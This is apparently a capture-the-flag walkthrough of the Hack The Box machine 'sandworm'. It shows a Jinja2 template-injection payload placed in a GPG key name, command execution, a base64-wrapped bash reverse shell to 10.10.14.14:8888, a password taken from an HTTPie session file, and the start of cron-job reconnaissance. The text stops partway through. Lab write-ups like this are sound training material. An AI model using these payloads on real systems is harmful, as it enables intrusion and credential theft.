# sandworm

| Hostname   | Difficulty |
| ---        | ---        |
| sandworm | Medium           |

Machine IP: 10.10.11.218 :

```bash
TARGET=10.10.11.218       # sandworm IP address
```

## Initial Reconnaissance

### Ports and services

Let's start by enumerate the exposed services :

```shell
# -p- : ports to scan. "-" is for all ports
NMAP_TARGET=$TARGET # target to scan
# -T4 : timing template (0(slower) to 5(faster) )
# -Pn : Treat all hosts as online -- skip host discovery
# --min-rate=1000 : Send packets no slower than <number> per second
NMAP_OUTPUT=$NMAP_TARGET-nmap-enumports # Save output to file(s)
nmap -p- $NMAP_TARGET -T4 -Pn --min-rate=1000 -oA $NMAP_OUTPUT
```

Result:

```text
Nmap scan report for 10.10.11.218
Host is up (0.025s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds
```

Let's enumerate deeper these services :

```shell
PORTS=22,80,443 # ports to scan. "-" is for all ports. ex: 80,22
NMAP_TARGET=$TARGET # target to scan
# -T4 : 
# -Pn :
# --min-rate=1000 :
# -sC : 
# -sV : 
# -A :
NMAP_OUTPUT=$NMAP_TARGET-nmap-inspect # Save output to file(s)
nmap -p $PORTS -sC -sV -A $TARGET -T4 --min-rate=1000 -oA $NMAP_OUTPUT
```

Result:

```text
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-11 19:36 CEST
Nmap scan report for 10.10.11.218
Host is up (0.025s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.0 - 5.3 (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   25.06 ms 10.10.14.1
2   25.22 ms 10.10.11.218

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.05 seconds
```

### Web application

From nmap :

```text
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
```

We know the hostname to use : ssa.htb. We can add it to out hosts file :

```shell
echo "10.10.11.218    ssa.htb" >> /etc/hosts
```

We can view it with a web browser :

```shell
firefox http://ssa.htb &
```

![[Pasted image 20230811194307.png]]

At the bottom of pages, there is a note on the flask framework used on this web application :

![[Pasted image 20230813145840.png]]

On the contact page, it is possible to post an encrypted message :

![[Pasted image 20230811222808.png]]

The link to the guide https://ssa.htb/guide :

![[Pasted image 20230811230245.png]]

It's possible to encrypt, decrypt, and verify signature.

The PGP public key is given : https://ssa.htb/pgp

```text
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQINBGRTz6YBEADA4xA4OQsDznyYLTi36TM769G/APBzGiTN3m140P9pOcA2VpgX
+9puOX6+nDQvyVrvfifdCB90F0zHTCPvkRNvvxfAXjpkZnAxXu5c0xq3Wj8nW3hW
DKvlCGuRbWkHDMwCGNT4eBduSmTc3ATwQ6HqJduHTOXpcZSJ0+1DkJ3Owd5sNV+Q
obLEL0VAafHI8pCWaEZCK+iQ1IIlEjykabMtgoMQI4Omf1UzFS+WrT9/bnrIAGLz
9UYnMd5UigMcbfDG+9gGMSCocORCfIXOwjazmkrHCInZNA86D4Q/8bof+bqmPPk7
y+nceZi8FOhC1c7IxwLvWE0YFXuyXtXsX9RpcXsEr6Xom5LcZLAC/5qL/E/1hJq6
MjYyz3WvEp2U+OYN7LYxq5C9f4l9OIO2okmFYrk4Sj2VqED5TfSvtiVOMQRF5Pfa
jbb57K6bRhCl95uOu5LdZQNMptbZKrFHFN4E1ZrYNtFNWG6WF1oHHkeOrZQJssw7
I6NaMOrSkWkGmwKpW0bct71USgSjR34E6f3WyzwJLwQymxbs0o1lnprgjWRkoa7b
JHcxHQl7M7DlNzo2Db8WrMxk4HlIcRvz7Wa7bcowH8Sj6EjxcUNtlJ5A6PLIoqN2
kQxM2qXBTr07amoD2tG1SK4+1V7h6maOJ1OEHmJsaDDgh9E+ISyDjmNUQQARAQAB
tEBTU0EgKE9mZmljaWFsIFBHUCBLZXkgb2YgdGhlIFNlY3JldCBTcHkgQWdlbmN5
LikgPGF0bGFzQHNzYS5odGI+iQJQBBMBCAA6FiEE1rqUIwIaCDnMxvPIxh1CkRC2
JdQFAmRTz6YCGwMFCwkIBwICIgIGFQoJCAsCAxYCAQIeBwIXgAAKCRDGHUKRELYl
1KYfD/0UAJ84quaWpHKONTKvfDeCWyj5Ngu2MOAQwk998q/wkJuwfyv3SPkNpGer
nWfXv7LIh3nuZXHZPxD3xz49Of/oIMImNVqHhSv5GRJgx1r4eL0QI2JeMDpy3xpL
Bs20oVM0njuJFEK01q9nVJUIsH6MzFtwbES4DwSfM/M2njwrwxdJOFYq12nOkyT4
Rs2KuONKHvNtU8U3a4fwayLBYWHpqECSc/A+Rjn/dcmDCDq4huY4ZowCLzpgypbX
gDrdLFDvmqtbOwHI73UF4qDH5zHPKFlwAgMI02mHKoS3nDgaf935pcO4xGj1zh7O
pDKoDhZw75fIwHJezGL5qfhMQQwBYMciJdBwV8QmiqQPD3Z9OGP+d9BIX/wM1WRA
cqeOjC6Qgs24FNDpD1NSi+AAorrE60GH/51aHpiY1nGX1OKG/RhvQMG2pVnZzYfY
eeBlTDsKCSVlG4YCjeG/2SK2NqmTAxzvyslEw1QvvqN06ZgKUZve33BK9slj+vTj
vONPMNp3e9UAdiZoTQvY6IaQ/MkgzSB48+2o2yLoSzcjAVyYVhsVruS/BRdSrzwf
5P/fkSnmStxoXB2Ti/UrTOdktWvGHixgfkgjmu/GZ1rW2c7wXcYll5ghWfDkdAYQ
lI2DHmulSs7Cv+wpGXklUPabxoEi4kw9qa8Ku/f/UEIfR2Yb0bkCDQRkU8+mARAA
un0kbnU27HmcLNoESRyzDS5NfpE4z9pJo4YA29VHVpmtM6PypqsSGMtcVBII9+I3
wDa7vIcQFjBr1Sn1b1UlsfHGpOKesZmrCePmeXdRUajexAkl76A7ErVasrUC4eLW
9rlUo9L+9RxuaeuPK7PY5RqvXVLzRducrYN1qhqoUXJHoBTTSKZYic0CLYSXyC3h
HkJDfvPAPVka4EFgJtrnnVNSgUN469JEE6d6ibtlJChjgVh7I5/IEYW97Fzaxi7t
I/NiU9ILEHopZzBKgJ7uWOHQqaeKiJNtiWozwpl3DVyx9f4L5FrJ/J8UsefjWdZs
aGfUG1uIa+ENjGJdxMHeTJiWJHqQh5tGlBjF3TwVtuTwLYuM53bcd+0HNSYB2V/m
N+2UUWn19o0NGbFWnAQP2ag+u946OHyEaKSyhiO/+FTCwCQoc21zLmpkZP/+I4xi
GqUFpZ41rPDX3VbtvCdyTogkIsLIhwE68lG6Y58Z2Vz/aXiKKZsOB66XFAUGrZuC
E35T6FTSPflDKTH33ENLAQcEqFcX8wl4SxfCP8qQrff+l/Yjs30o66uoe8N0mcfJ
CSESEGF02V24S03GY/cgS9Mf9LisvtXs7fi0EpzH4vdg5S8EGPuQhJD7LKvJKxkq
67C7zbcGjYBYacWHl7HA5OsLYMKxr+dniXcHp2DtI2kAEQEAAYkCNgQYAQgAIBYh
BNa6lCMCGgg5zMbzyMYdQpEQtiXUBQJkU8+mAhsMAAoJEMYdQpEQtiXUnpgP/3AL
guRsEWpxAvAnJcWCmbqrW/YI5xEd25N+1qKOspFaOSrL4peNPWpF8O/EDT7xgV44
m+7l/eZ29sre6jYyRlXLwU1O9YCRK5dj929PutcN4Grvp4f9jYX9cwz37+ROGEW7
rcQqiCre+I2qi8QMmEVUnbDvEL7W3lF9m+xNnNfyOOoMAU79bc4UorHU+dDFrbDa
GFoox7nxyDQ6X6jZoXFHqhE2fjxGWvVFgfz+Hvdoi6TWL/kqZVr6M3VlZoExwEm4
TWwDMOiT3YvLo+gggeP52k8dnoJWzYFA4pigwOlagAElMrh+/MjF02XbevAH/Dv/
iTMKYf4gocCtIK4PdDpbEJB/B6T8soOooHNkh1N4UyKaX3JT0gxib6iSWRmjjH0q
TzD5J1PDeLHuTQOOgY8gzKFuRwyHOPuvfJoowwP4q6aB2H+pDGD2ewCHBGj2waKK
Pw5uOLyFzzI6kHNLdKDk7CEvv7qZVn+6CSjd7lAAHI2CcZnjH/r/rLhR/zYU2Mrv
yCFnau7h8J/ohN0ICqTbe89rk+Bn0YIZkJhbxZBrTLBVvqcU2/nkS8Rswy2rqdKo
a3xUUFA+oyvEC0DT7IRMJrXWRRmnAw261/lBGzDFXP8E79ok1utrRplSe7VOBl7U
FxEcPBaB0bhe5Fh7fQ811EMG1Q6Rq/mr8o8bUfHh
=P8U3
-----END PGP PUBLIC KEY BLOCK-----
```

There is also a notice at the bottom "Verifying signed messages" :

![[Pasted image 20230811231157.png]]

Some resources heres for GPG :
- https://www.gnupg.org/documentation/manuals/gnupg/OpenPGP-Key-Management.html#OpenPGP-Key-Management
- https://access.redhat.com/solutions/1541303
- https://grimoire.carcano.ch/blog/a-quick-easy-yet-comprehensive-gpg-tutorial/

So we generate a signed message :

```shell
# Settings
GPG_REAL_NAME="John Doe (Is that really me ?)"
GPG_REAL_EMAIL="john@fake-ssa.htb"
GPG_ALGO="rsa"
GPG_USAGE="sign,cert,encr"
GPG_EXPIRATRION="never"

# remove key if exists
gpg --delete-secret-key $GPG_REAL_EMAIL
gpg --delete-key $GPG_REAL_EMAIL

# Cleaning 
rm -f ssa-msg.*

# Quick Generate key pair
# NB: give passphrase
gpg --quick-gen-key "$GPG_REAL_NAME <$GPG_REAL_EMAIL>" $GPG_ALGO $GPG_USAGE $GPG_EXPIRATRION

# Check if required
gpg --list-key
gpg --list-secret-key

# generate plain text message
cat <<EOF > ssa-msg.txt
This is a plain message
EOF

# encrypt and sign message
# gpg --encrypt --sign --armor -r $GPG_REAL_EMAIL ssa-msg.txt
# output: ssa-msg.txt.asc

# Simple message signing here
# NB: provide passphrase here
gpg --clearsign ssa-msg.txt

# Display result
cat ssa-msg.txt.asc

# export/display public key as ASCII
gpg --export --armor $GPG_REAL_EMAIL
```

When provided to https://ssa.htb/guide, the form validate the signature :

![[Pasted image 20230813145705.png]]

The output message is pretty formatted with information, probably through a template.

As previously noted, this is a flask framework, using jinja template engine :

- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#jinja-injection
- https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

In order to improve the process, we can use curl to get a direct POST and replay in the console :

```shell
# Settings
GPG_REAL_NAME="John Doe (Is that really me ?)"
GPG_REAL_EMAIL="john@fake-ssa.htb"
GPG_ALGO="rsa"
GPG_USAGE="sign,cert,encr"
GPG_EXPIRATRION="never"

# remove key if exists
gpg --delete-secret-key $GPG_REAL_EMAIL
gpg --delete-key $GPG_REAL_EMAIL

# Cleaning 
rm -f ssa-msg.*

# Quick Generate key pair
# NB: give passphrase
gpg --quick-gen-key "$GPG_REAL_NAME <$GPG_REAL_EMAIL>" $GPG_ALGO $GPG_USAGE $GPG_EXPIRATRION

# Check if required
gpg --list-key
gpg --list-secret-key

# generate plain text message
cat <<EOF > ssa-msg.txt
This is a plain message
EOF

# encrypt and sign message
# gpg --encrypt --sign --armor -r $GPG_REAL_EMAIL ssa-msg.txt
# output: ssa-msg.txt.asc

# Simple message signing here
# NB: provide passphrase here
gpg --clearsign ssa-msg.txt

# generate the post request :
curl -i -s -k -X POST \
 --data-urlencode "signed_text=$(cat ssa-msg.txt.asc )" --data-urlencode "public_key=$( gpg --export --armor $GPG_REAL_EMAIL )" https://ssa.htb/process
```

In order to test, we can use `{{ dict.__base__.__subclasses__() }}` and insert it in the name field :

```shell
# Settings
GPG_REAL_NAME="John Doe {{ dict.__base__.__subclasses__() }} (Is that really me ?)"
GPG_REAL_EMAIL="john@fake-ssa.htb"
GPG_ALGO="rsa"
GPG_USAGE="sign,cert,encr"
GPG_EXPIRATRION="never"

# remove key if exists
gpg --delete-secret-key $GPG_REAL_EMAIL
gpg --delete-key $GPG_REAL_EMAIL

# Cleaning 
rm -f ssa-msg.*

# Quick Generate key pair
# NB: give passphrase
gpg --quick-gen-key "$GPG_REAL_NAME <$GPG_REAL_EMAIL>" $GPG_ALGO $GPG_USAGE $GPG_EXPIRATRION

# Check if required
gpg --list-key
gpg --list-secret-key

# generate plain text message
cat <<EOF > ssa-msg.txt
This is a plain message
EOF

# encrypt and sign message
# gpg --encrypt --sign --armor -r $GPG_REAL_EMAIL ssa-msg.txt
# output: ssa-msg.txt.asc

# Simple message signing here
# NB: provide passphrase here
gpg --clearsign ssa-msg.txt

# generate the post request :
curl -i -s -k -X POST --data-urlencode "signed_text=$(cat ssa-msg.txt.asc )" --data-urlencode "public_key=$( gpg --export --armor $GPG_REAL_EMAIL )" https://ssa.htb/process
```

As a result, we have a SSTI (Server Side Template Injection): 

```text
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 13 Aug 2023 13:50:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 70185
Connection: keep-alive

Signature is valid!

[GNUPG:] NEWSIG
gpg: Signature made Sun 13 Aug 2023 01:50:38 PM UTC
gpg:                using RSA key 174485E82192D21A3D1A0F751FF43823F8C9226B
[GNUPG:] KEY_CONSIDERED 174485E82192D21A3D1A0F751FF43823F8C9226B 0
[GNUPG:] SIG_ID F9UX36mzUFyOcRvCrlOJHhV7GJI 2023-08-13 1691934638
[GNUPG:] KEY_CONSIDERED 174485E82192D21A3D1A0F751FF43823F8C9226B 0
[GNUPG:] GOODSIG 1FF43823F8C9226B John Doe [&lt;class &#39;type&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;dict_reverseitemiterator&#39;&gt;, &lt;class &#39;dict_reversekeyiterator&#39;&gt;, &lt;class &#39;dict_reversevalueiterator&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;pickle.PickleBuffer&#39;&gt;,
...
```

## Initial access

### Exploitation

From https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#filter-bypasses, we can try to execute some system commands (id):

```shell
# Settings
GPG_REAL_NAME="John Doe {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} (Is that really me ?)"
GPG_REAL_EMAIL="john@fake-ssa.htb"
GPG_ALGO="rsa"
GPG_USAGE="sign,cert,encr"
GPG_EXPIRATRION="never"

# remove key if exists
gpg --delete-secret-key $GPG_REAL_EMAIL
gpg --delete-key $GPG_REAL_EMAIL

# Cleaning 
rm -f ssa-msg.*

# Quick Generate key pair
# NB: give passphrase
gpg --quick-gen-key "$GPG_REAL_NAME <$GPG_REAL_EMAIL>" $GPG_ALGO $GPG_USAGE $GPG_EXPIRATRION

# generate plain text message
cat <<EOF > ssa-msg.txt
This is a plain message
EOF

# Simple message signing here
# NB: provide passphrase here
gpg --clearsign ssa-msg.txt

# generate the post request :
curl -i -s -k -X POST --data-urlencode "signed_text=$(cat ssa-msg.txt.asc )" --data-urlencode "public_key=$( gpg --export --armor $GPG_REAL_EMAIL )" https://ssa.htb/process
```

Result:

```text
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 13 Aug 2023 14:18:47 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1027
Connection: keep-alive

Signature is valid!

[GNUPG:] NEWSIG
gpg: Signature made Sun 13 Aug 2023 02:18:45 PM UTC
gpg:                using RSA key F6A89CB6F289DB2126490439410E0D2B5050F8DB
[GNUPG:] KEY_CONSIDERED F6A89CB6F289DB2126490439410E0D2B5050F8DB 0
[GNUPG:] SIG_ID 51pa2GC7Z0coOPchZu0nIEOwFkQ 2023-08-13 1691936325
[GNUPG:] KEY_CONSIDERED F6A89CB6F289DB2126490439410E0D2B5050F8DB 0
[GNUPG:] GOODSIG 410E0D2B5050F8DB John Doe uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
 (Is that really me ?) <john@fake-ssa.htb>
gpg: Good signature from "John Doe uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
 (Is that really me ?) <john@fake-ssa.htb>" [unknown]
[GNUPG:] VALIDSIG F6A89CB6F289DB2126490439410E0D2B5050F8DB 2023-08-13 1691936325 0 4 0 1 10 01 F6A89CB6F289DB2126490439410E0D2B5050F8DB
[GNUPG:] TRUST_UNDEFINED 0 pgp
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: F6A8 9CB6 F289 DB21 2649  0439 410E 0D2B 5050 F8DB
```

The command has executed :

```text
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
```

We can now try to get a shell to that host.

From [https://www.revshells.com/](https://www.revshells.com/):

- Listener type: nc
- Reverse
  - OS: Linux
  - payload : Bash -i

The payload: 

`bash -i >& /dev/tcp/10.10.14.14/8888 0>&1`

Generate the payload :

```shell
# Settings
GPG_REAL_NAME="John Doe {{ request.application.__globals__.__builtins__.__import__('os').popen('bash -i >& /dev/tcp/10.10.14.14/8888 0>&1').read() }} (Is that really me ?)"
GPG_REAL_EMAIL="john@fake-ssa.htb"
GPG_ALGO="rsa"
GPG_USAGE="sign,cert,encr"
GPG_EXPIRATRION="never"

# remove key if exists
gpg --delete-secret-key $GPG_REAL_EMAIL
gpg --delete-key $GPG_REAL_EMAIL

# Cleaning 
rm -f ssa-msg.*

# Quick Generate key pair
# NB: give passphrase
gpg --quick-gen-key "$GPG_REAL_NAME <$GPG_REAL_EMAIL>" $GPG_ALGO $GPG_USAGE $GPG_EXPIRATRION

# generate plain text message
cat <<EOF > ssa-msg.txt
This is a plain message
EOF

# Simple message signing here
# NB: provide passphrase here
gpg --clearsign ssa-msg.txt

# generate the post request :
curl -i -s -k -X POST --data-urlencode "signed_text=$(cat ssa-msg.txt.asc )" --data-urlencode "public_key=$( gpg --export --armor $GPG_REAL_EMAIL )" https://ssa.htb/process
```

The shell listener :

```shell
rlwrap nc -lvnp 8888
```


but nothing

< and > chars seems to cause issue ...


echo -n "bash -i >& /dev/tcp/10.10.14.14/8888 0>&1" | base64                                         
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC84ODg4IDA+JjE=


```shell
# Settings
GPG_REAL_NAME="John Doe {{ request.application.__globals__.__builtins__.__import__('os').popen('echo -n \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC84ODg4IDA+JjE=\" | base64 -d | bash').read() }} (Is that really me ?)"
GPG_REAL_EMAIL="john@fake-ssa.htb"
GPG_ALGO="rsa"
GPG_USAGE="sign,cert,encr"
GPG_EXPIRATRION="never"

# remove key if exists
gpg --delete-secret-key $GPG_REAL_EMAIL
gpg --delete-key $GPG_REAL_EMAIL

# Cleaning 
rm -f ssa-msg.*

# Quick Generate key pair
# NB: give passphrase
gpg --quick-gen-key "$GPG_REAL_NAME <$GPG_REAL_EMAIL>" $GPG_ALGO $GPG_USAGE $GPG_EXPIRATRION

# generate plain text message
cat <<EOF > ssa-msg.txt
This is a plain message
EOF

# Simple message signing here
# NB: provide passphrase here
gpg --clearsign ssa-msg.txt

# generate the post request :
curl -i -s -k -X POST --data-urlencode "signed_text=$(cat ssa-msg.txt.asc )" --data-urlencode "public_key=$( gpg --export --armor $GPG_REAL_EMAIL )" https://ssa.htb/process
```

And we have a shell :

```text
rlwrap -cAr nc -lvnp 8888
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.11.218.
Ncat: Connection from 10.10.11.218:35794.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ 

```

### Maintaining access

## Post-Exploitation

### Host Reconnaissance

We seem to be in a sandbox :

```shell
id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
pwd
pwd
/var/www/html/SSA
sudo -l
sudo -l
Could not find command-not-found database. Run 'sudo apt update' to populate it.
sudo: command not found
uname -a
uname -a
Could not find command-not-found database. Run 'sudo apt update' to populate it.
uname: command not found
whoami
whoami
Could not find command-not-found database. Run 'sudo apt update' to populate it.
whoami: command not found

```

### Lateral movement : atlas (jailed) => silentobserver (SSH)

exploring the home directory of the user, we can find an interesting file :

```shell
ls -la /home

total 12
drwxr-xr-x  4 nobody nogroup 4096 May  4 15:19 .
drwxr-xr-x 19 nobody nogroup 4096 Jun  7 13:53 ..
drwxr-xr-x  8 atlas  atlas   4096 Jun  7 13:44 atlas
dr--------  2 nobody nogroup   40 Aug 12 20:09 silentobserver

cd 
ls -la

total 44
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 .
drwxr-xr-x 4 nobody nogroup 4096 May  4 15:19 ..
lrwxrwxrwx 1 nobody nogroup    9 Nov 22  2022 .bash_history -> /dev/null
-rw-r--r-- 1 atlas  atlas    220 Nov 22  2022 .bash_logout
-rw-r--r-- 1 atlas  atlas   3771 Nov 22  2022 .bashrc
drwxrwxr-x 2 atlas  atlas   4096 Jun  6 08:49 .cache
drwxrwxr-x 3 atlas  atlas   4096 Feb  7  2023 .cargo
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .config
drwx------ 4 atlas  atlas   4096 Aug 13 14:26 .gnupg
drwxrwxr-x 6 atlas  atlas   4096 Feb  6  2023 .local
-rw-r--r-- 1 atlas  atlas    807 Nov 22  2022 .profile
drwx------ 2 atlas  atlas   4096 Feb  6  2023 .ssh

cd .ssh
ls -la

total 8
drwx------ 2 atlas atlas 4096 Feb  6  2023 .
drwxr-xr-x 8 atlas atlas 4096 Jun  7 13:44 ..

cd ..
cd .cargo
ls -la

total 12
drwxrwxr-x 3 atlas atlas 4096 Feb  7  2023 .
drwxr-xr-x 8 atlas atlas 4096 Jun  7 13:44 ..
-rw-rw-r-- 1 atlas atlas    0 Feb  7  2023 .package-cache
drwxrwxr-x 5 atlas atlas 4096 Jun  6 08:24 registry

cd ..
cd .config
ls -la

total 12
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 ..
dr-------- 2 nobody nogroup   40 Aug 12 20:09 firejail
drwxrwxr-x 3 nobody atlas   4096 Jan 15  2023 httpie

cd firejail 

bash: cd: firejail: Permission denied

cd httpie
ls -la

total 12
drwxrwxr-x 3 nobody atlas 4096 Jan 15  2023 .
drwxrwxr-x 4 atlas  atlas 4096 Jan 15  2023 ..
drwxrwxr-x 3 nobody atlas 4096 Jan 15  2023 sessions

cd sessions
ls -la

total 12
drwxrwxr-x 3 nobody atlas 4096 Jan 15  2023 .
drwxrwxr-x 3 nobody atlas 4096 Jan 15  2023 ..
drwxrwx--- 2 nobody atlas 4096 May  4 17:30 localhost_5000

cd localhost_5000
ls -la

total 12
drwxrwx--- 2 nobody atlas 4096 May  4 17:30 .
drwxrwxr-x 3 nobody atlas 4096 Jan 15  2023 ..
-rw-r--r-- 1 nobody atlas  611 May  4 17:26 admin.json

cat admin.json

{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

Credential found :

| Username  | email        | Password  | Hash      | Usage     |
| ---       | ---          | ---       | ---       | ---       |
| silentobserver          |              | quietLiketheWind22          |           |           |


This credential can open a SSH connection :

```shell
ssh silentobserver@ssa.htb
```

### Lateral movement : silentobserver (SSH) => atlas

in `/opt` folder, there are some utilities :

```shell
silentobserver@sandworm:/opt$ ls -la
total 16
drwxr-xr-x  4 root root  4096 Aug 13 17:56 .
drwxr-xr-x 19 root root  4096 Jun  7 13:53 ..
drwxr-xr-x  3 root atlas 4096 May  4 17:26 crates
drwxr-xr-x  5 root atlas 4096 Jun  6 11:49 tipnet
silentobserver@sandworm:/opt$ ls -la *
crates:
total 12
drwxr-xr-x 3 root  atlas          4096 May  4 17:26 .
drwxr-xr-x 4 root  root           4096 Aug 13 17:56 ..
drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 logger

tipnet:
total 172
drwxr-xr-x 5 root  atlas  4096 Jun  6 11:49 .
drwxr-xr-x 4 root  root   4096 Aug 13 17:56 ..
-rw-rw-r-- 1 atlas atlas 92862 Aug 13 17:56 access.log
-rw-r--r-- 1 root  atlas 46161 May  4 16:38 Cargo.lock
-rw-r--r-- 1 root  atlas   288 May  4 15:50 Cargo.toml
drwxr-xr-- 6 root  atlas  4096 Jun  6 11:49 .git
-rwxr-xr-- 1 root  atlas     8 Feb  8  2023 .gitignore
drwxr-xr-x 2 root  atlas  4096 Jun  6 11:49 src
drwxr-xr-x 3 root  atlas  4096 Jun  6 11:49 target

```

The access.log file indicates that this tool runs evry 2 minutes :

```shell
silentobserver@sandworm:/opt/tipnet$ tail access.log
[2023-08-13 17:40:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-08-13 17:42:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-08-13 17:44:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-08-13 17:46:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-08-13 17:48:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-08-13 17:50:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-08-13 17:52:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-08-13 17:54:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-08-13 17:56:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-08-13 17:58:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
```

With `ps -efH | grep opt` at exact minute (or use pspy64) give more information :

```text
root       19379   19378  0 17:56 ?        00:00:00       /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
```

This is run under atlas account.

There is the compiled version in thge debug folder :

```shell
ls -la target/debug/

total 57800
drwxrwxr-x   7 root  atlas     4096 Jun  6 11:49 .
drwxr-xr-x   3 root  atlas     4096 Jun  6 11:49 ..
